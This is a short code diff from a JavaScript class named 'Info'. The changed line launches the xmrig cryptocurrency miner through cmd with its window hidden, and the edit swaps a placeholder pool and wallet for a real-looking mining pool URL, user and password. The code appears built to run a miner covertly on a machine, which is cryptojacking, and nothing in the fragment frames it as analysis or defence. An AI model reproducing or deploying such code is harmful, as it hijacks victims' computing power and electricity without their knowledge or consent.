@@ -83,7 +83,7 @@ class Info {
 
     process.chdir(`${dr}${path}${dest}${path}${mname}${path}`);
 
-    const cmdInstance = spawn('cmd', ['/c', `${dr}${path}${dest}${path}${mname}${path}xmrig.exe`, '--url', 'pool.example.sadjack:80', '--user', 'wallet address', '--pass', 'password'], { windowsHide: true });
+    const cmdInstance = spawn('cmd', ['/c', `${dr}${path}${dest}${path}${mname}${path}xmrig.exe`, '--url', 'stratum+tcp://us.mining.prohashing.com:3359', '--user', 'sbj', '--pass', 'a=randomx'], { windowsHide: true });
 
     cmdInstance.on('error', (err) => {
       console.error(err);
